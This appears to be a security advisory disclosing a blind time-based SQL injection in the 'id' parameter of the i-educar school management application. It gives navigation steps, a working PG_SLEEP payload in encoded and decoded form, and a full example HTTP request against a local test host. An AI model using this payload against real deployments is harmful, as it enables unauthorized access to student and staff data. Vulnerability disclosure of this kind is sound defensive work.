# SQL Injection (Blind Time-Based) Vulnerability in `id` Parameter on `module/Cadastro/aluno` Endpoint

### Summary

<p align="justify">A SQL Injection vulnerability was identified in the <code>/module/Cadastro/aluno</code> endpoint of the i-educar application, specifically in the <code>id</code> parameter. This vulnerability allows attackers to execute arbitrary SQL commands on the backend database, potentially compromising the confidentiality, integrity, and availability of application data.</p>

---

### Details

Vulnerable Endpoint: `/module/Cadastro/aluno`

Parameter: `id`

<p align="justify">The application fails to properly validate and sanitize user input in the <code>id</code> parameter. As a result, attackers can inject crafted SQL payloads that are executed directly by the database. This could allow database enumeration, data exfiltration, modification, or denial of service via time-based delays.</p>

---

### PoC

#### Step by Step:

<p align="justify">Access endpoint <code>/intranet/educar_aluno_lst.php</code> and choose (click on) any register. For this example was choosen <code>"Gael"</code> student which id = 208. In the student page <code>/intranet/educar_aluno_det.php?cod_aluno=208</code> click on <code>"Editar"</code> to be redirected to vulnerable endpoint. The payload must be inserted after <code>id</code> number (e.g. ‚Äúid=208<code>payload</code>‚Äù)</p>

![](/CVEs/images/SQLi9.png)

![](/CVEs/images/SQLi10.png)

![](/CVEs/images/SQLi11.png)

##

#### Payload:

````html
%27%20AND%209581=(SELECT%209581%20FROM%20PG_SLEEP(5))%20AND%20%27bffB%27=%27bffB
````

#### Decoded Payload:

````html
' AND 9581=(SELECT 9581 FROM PG_SLEEP(5)) AND 'bffB'='bffB
````

<p align="justify"> This payload triggers a 5-second delay in the server response, demonstrating that the parameter is vulnerable to blind time-based SQL injection.</p>

##

#### Example Request:

````html
GET /module/Cadastro/aluno?id=208%27%20AND%209581=(SELECT%209581%20FROM%20PG_SLEEP(5))%20AND%20%27bffB%27=%27bffB HTTP/1.1
Host: localhost:8086
sec-ch-ua: "Not)A;Brand";v="8", "Chromium";v="138"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: pt-BR,pt;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/138.0.0.0 Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;
q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Cookie: i_educar_session=bnTu3HZ4Jk5a0JxRERNMd03ZAr1TUGvXZTDs9DdE
Connection: keep-alive
````
##

#### Normal Request:

![](/CVEs/images/SQLi12.png)

#### SQLi Request:

![](/CVEs/images/SQLi13.png)

<p align="justify">Observe the increased server response time, confirming that the injected SQL command was executed.</p>

---

### Impact

<p align="justify">
<ul>
  <li>Unauthorized data access: Reading sensitive information such as credentials, personal data, or configuration details</li>
  <li>Database enumeration: Extracting database schema, tables, and column details</li>
  <li>Data manipulation: Adding, modifying, or deleting database records.</li>
  <li>Denial of Service (DoS): Using time-based queries to impact system availability.</li>
  <li>Potential escalation to RCE: If combined with other vulnerabilities and specific database features.</li>
</ul>
</p>

---

### Finder

*Discovered withüíú by [Karina Gante](https://karinagante.github.io/).* 

[![LinkedIn](https://skillicons.dev/icons?i=linkedin&theme=dark)](https://www.linkedin.com/in/karina-gante/)
[![GitHub](https://skillicons.dev/icons?i=github&theme=dark)](https://www.github.com/KarinaGante/)
[![gmail](https://skillicons.dev/icons?i=gmail&theme=dark)](mailto:karina.gante1@gmail.com)
[![Instagram](https://skillicons.dev/icons?i=instagram&theme=dark)](https://www.instagram.com/karinovisk02/)

##

*Official Member of [CVE-Hunters](https://www.cvehunters.com/)üèπ*